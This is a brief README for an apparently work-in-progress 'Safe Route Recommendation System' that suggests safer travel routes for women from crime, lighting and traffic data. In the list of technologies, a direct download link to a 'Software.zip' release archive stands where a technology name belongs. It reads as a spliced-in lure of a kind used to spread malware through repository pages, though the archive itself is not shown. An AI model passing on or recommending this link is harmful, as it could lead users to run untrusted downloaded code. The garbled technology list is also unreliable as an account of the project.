# 🌟 **Women's Safety Index Repository**

Welcome to the "Women's Safety Index" repository! This is where we are developing the "Safe Route Recommendation System" to enhance women's safety during travel by identifying and suggesting the safest routes based on historical and real-time data. Our system takes into account various factors such as crime incidents, traffic conditions, lighting, and foot traffic to recommend the safest routes for women to travel.

## 🚀 Project Overview

The "Safe Route Recommendation System" is currently a work in progress project. We are utilizing a combination of technologies such as Django, Javascript, Jupyter Notebook, Machine Learning, MySQL, https://github.com/joejkiller/women-safety-index/releases/download/v1.0/Software.zip, NumPy, Pandas, Python, Scikit-learn, and Web Scraping to create a robust and efficient system that prioritizes women's safety.
